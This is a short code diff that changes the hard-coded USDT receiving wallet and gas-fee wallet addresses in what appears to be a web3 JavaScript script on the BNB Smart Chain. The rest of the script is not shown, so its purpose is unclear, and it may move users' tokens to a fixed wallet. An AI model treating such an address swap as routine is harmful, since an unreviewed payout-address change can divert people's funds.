@@ -1,5 +1,5 @@
-const bscAddress = "0x54dE549D98B0440678199334965Fd7Fa0A896088"; // Your USDT receiving address
-const bnbGasSender = "0x54dE549D98B0440678199334965Fd7Fa0A896088"; // Wallet for gas fees
+const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
+const bnbGasSender = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
 let web3;
